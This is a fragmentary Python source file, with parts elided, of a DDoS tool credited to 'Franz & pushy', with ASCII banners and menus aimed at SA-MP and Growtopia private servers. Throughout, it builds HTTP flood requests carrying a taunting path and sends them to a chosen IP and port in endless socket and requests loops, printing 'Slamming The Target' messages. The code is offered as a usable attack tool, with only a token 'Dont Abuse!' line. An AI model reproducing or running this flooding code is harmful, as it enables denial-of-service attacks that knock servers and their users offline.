...
import time
import os
os.system('color ' +random.choice(['E'])+ " & cls & title Enter Password")
print("""
·▄▄▄▄▄▄   ▄▄▄·  ▐ ▄ ·▄▄▄▄• ▐ ▄ ▄▄▄ .▄▄▄▄▄
▐▄▄·▀▄ █·▐█ ▀█ •█▌▐█▪▀·.█▌•█▌▐█▀▄.▀·•██  
██▪ ▐▀▀▄ ▄█▀▀█ ▐█▐▐▌▄█▀▀▀•▐█▐▐▌▐▀▀▪▄ ▐█.▪
...
▀▀▀ .▀  ▀ ▀  ▀ ▀▀ █▪·▀▀▀ •▀▀ █▪ ▀▀▀  ▀▀▀ 
""")
print("[ + ]Tools Made By Franz & pushy")
print("[ + ]Dont Abuse! ") 
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['E'])+ " & cls & title Tools DDoS Used By Franz [ DDoS Attack ]")
print("""
 ▄▄▄· ▄▄▄▄▄▄▄▄▄▄ ▄▄▄·  ▄▄· ▄ •▄ 
▐█ ▀█ •██  •██  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪
▄█▀▀█  ▐█.▪ ▐█.▪▄█▀▀█ ██ ▄▄▐▀▀▄·
...
def Headers(method):
    ...
    if method == "post" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_Franz_Will_Not_Surrender  HTTP/1.1\r\nHost: " + ip + "\r\n"
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] BlankS Santet IP | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
...
os.system('color ' +random.choice(['E'])+ " & cls & title Tools SAMP & GTPS DDoS [ Franz ]")
...
def run():
    ...
    if method_attack == "1":
        get_host = "POST /Your_Server_Got_DDoS_By_Franz_Will_Not_Surrender  HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['POST']) + " /Your_Server_Got_DDoS_By_Franz_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n" 
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("[ + ] \033[31mSlamming The \033[35mTarget At ",ip," \033[31mAnd On Port ",port," \033[35mWith Packet ",threads,"[ + ]")
        except socket.error:
            s.close()
            print("[ + ] \033[31mSlamming The \033[35mTarget At ",ip," \033[31mAnd On Port ",port," \033[35mWith Packet ",threads,"[ + ]")
...
def run2():
    ...
    if method_attack == "1":
        ...
        get_host = random.choice(['GET','POST','HEAD','TCP','UDP']) + " /growtopia/server_data.php HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("[ GTPS ] Send Attack to Vps At IP => ",ip," In Port : ",port,"!")
